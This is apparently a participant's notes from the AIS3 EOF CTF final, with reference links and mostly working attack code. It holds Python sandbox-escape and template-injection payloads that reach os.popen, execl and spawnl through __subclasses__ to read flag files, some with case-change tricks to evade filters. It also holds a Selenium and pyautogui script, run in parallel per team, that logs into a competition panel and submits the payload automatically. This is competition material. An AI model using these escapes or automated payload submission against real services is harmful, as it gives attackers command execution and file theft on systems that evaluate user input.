---
title: EOF AIS3 Final
tags: [CTF, AIS3]

category: "Security > Competition"
---

# EOF AIS3 Final
###### tags: `CTF` `AIS3`

## Reference
https://jzchangmark.wordpress.com/2015/03/05/%E9%80%8F%E9%81%8E-selenium-%E6%93%8D%E4%BD%9C%E4%B8%8B%E6%8B%89%E5%BC%8F%E9%81%B8%E5%96%AE-select/

https://www.qnx.com/developers/docs/7.1/#com.qnx.doc.neutrino.lib_ref/topic/s/spawnl.html

https://github.com/mhchia/practice/blob/master/ctf/final/write_up.md

SSTI: https://www.freebuf.com/articles/network/258136.html
https://www.compart.com/en/unicode/U+FF5B
https://chinnidiwakar.gitbook.io/githubimport/pentesting-web/ssti-server-side-template-injection

Payload:
```python!
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", "./flag.txt"))


print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen']("cat /flag.txt"))

file = 'FLAG.TXT'
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", file.lower()))

file = 'FLAG.TXT'
command = 'EXECL'
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[command.lower()]("/bin/cat", "cat", file.lower()))


file = 'FLAG.TXT'
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['spawnl']('P_WAIT', "/bin/cat", "cat", file.lower()))
```
## Script - run_script.py
:::spoiler
```python=
import subprocess
import time
import multiprocessing as mp


def cycle(i):
    subprocess.call(['python', 'script.py', '--team', str(i)])

if __name__ == "__main__":
    p1 = mp.Process(target=cycle, args=('1',))
    p2 = mp.Process(target=cycle, args=('2',))
    # p3 = mp.Process(target=cycle, args=('3',))
    # p4 = mp.Process(target=cycle, args=('4',))
    # p5 = mp.Process(target=cycle, args=('5',))
    # p7 = mp.Process(target=cycle, args=('7',))
    # p8 = mp.Process(target=cycle, args=('8',))
    # p9 = mp.Process(target=cycle, args=('9',))
    # p10 = mp.Process(target=cycle, args=('10',))
    # p11 = mp.Process(target=cycle, args=('11',))
    # p12 = mp.Process(target=cycle, args=('12',))
    # p13 = mp.Process(target=cycle, args=('13',))
    # p14 = mp.Process(target=cycle, args=('14',))
    # p15 = mp.Process(target=cycle, args=('15',))
    # p16 = mp.Process(target=cycle, args=('16',))
    # p17 = mp.Process(target=cycle, args=('17',))
    # p18 = mp.Process(target=cycle, args=('18',))
    # p19 = mp.Process(target=cycle, args=('19',))
    # p20 = mp.Process(target=cycle, args=('20',))
    # p21 = mp.Process(target=cycle, args=('21',))
    # p22 = mp.Process(target=cycle, args=('22',))
    # p23 = mp.Process(target=cycle, args=('23',))
    # p24 = mp.Process(target=cycle, args=('24',))
    

    p1.start()
    time.sleep(2)
    p2.start()
    time.sleep(2)
    # p3.start()
    # p4.start()
    # p5.start()
    # p7.start()
    # p8.start()
    # p9.start()
    # p10.start()
    # p11.start()
    # p12.start()
    # p13.start()
    # p14.start()
    # p15.start()
    # p16.start()
    # p17.start()
    # p18.start()
    # p19.start()
    # p20.start()
    # p21.start()
    # p22.start()
    # p23.start()
    # p24.start()

    p1.join()
    p2.join()
    # p3.join()
    # p4.join()
    # p5.join()
    # p7.join()
    # p8.join()
    # p9.join()
    # p10.join()
    # p11.join()
    # p12.join()
    # p13.join()
    # p14.join()
    # p15.join()
    # p16.join()
    # p17.join()
    # p18.join()
    # p19.join()
    # p20.join()
    # p21.join()
    # p22.join()
    # p23.join()
    # p24.join()
```
:::

## Script - script.py
```python!=
from selenium.webdriver.chrome.options import Options
import time
from http.client import PAYMENT_REQUIRED
from selenium import webdriver
from selenium.webdriver.common.keys import Keys #send keys on keyboard

'''hault the page until it find some label appear on the page'''
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

'''imitate the action that human execute on mouse and keyboard'''
from selenium.webdriver.common.action_chains import ActionChains

'''to do some keyboard instruction-'''
import pyautogui
import time
import argparse

def parse_args():
    parser = argparse.ArgumentParser()
    '''ARM'''
    parser.add_argument('--team', type=str, default='1', help='team id.')

    return parser.parse_args()
    
def read_write_file(type, write_data = None):
    file_path = 'D:/Download/test.txt'
    if type == 'r':
        f = open(file_path, 'r', encoding="utf-8") #u must add encoding parameter
        arr = []
        for line in f.readlines():
            arr.append(line)
        f.close()
        return arr
    elif type == 'a':
        f = open(file_path, 'a', encoding='UTF-8')
        f.write(write_data + '\n')
        f.close()
    elif type == 'refresh':
        f = open(file_path, 'w', encoding='UTF-8')
        f.write('')
        f.close()

args = parse_args() 


from selenium.webdriver.support.wait import WebDriverWait
driver = webdriver.Chrome('D:/Download/chromedriver.exe')
driver.get("http://10.11.0.1:5001/panel")

token = '123'
payload = "print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen']('cat flag.txt').read())"


'''Login'''
text_input = driver.find_element(By.ID, "token")
ActionChains(driver).send_keys_to_element(text_input, token).perform()
driver.find_element(By.TAG_NAME, 'button').click()
time.sleep(5)

'''Choose which team'''
# from selenium.webdriver.support.ui import Select
# select = Select(driver.find_element(By.NAME, 'target'))
# select.select_by_index(0)
# from selenium.webdriver.common.keys import Keys
# for op in select.options:
#     if op.text != '--------passing_baseline_v2---------':
#         css_panel = driver.find_element(By.CLASS_NAME, "CodeMirror")
#         print(css_panel)
#         code_mirror_element = css_panel.find_element(By.XPATH, "/html/body/main/form[2]/p[2]/div/div[1]/textarea")
#         print(code_mirror_element)
#         code_mirror_element.send_keys(Keys.CONTROL + "a")
#     time.sleep(5)
#     print(op.text)

'''Send Payload'''
cursor = driver.find_element(By.XPATH, "//form[@id='jail-form']/p/div/div[6]")
cursor.click()
pyautogui.hotkey('ctrl','a')
pyautogui.hotkey('delete')
ActionChains(driver).send_keys_to_element(cursor, payload).perform()
time.sleep(5)  # Scrolled down by user
driver.find_element(By.XPATH, '/html/body/main/form/button').click()
time.sleep(5)

'''Catch Response & Write to file'''
print(driver.find_element(By.XPATH, '/html/body/div/div/div[2]'))
print(args.team)
# read_write_file('a', 123)
```

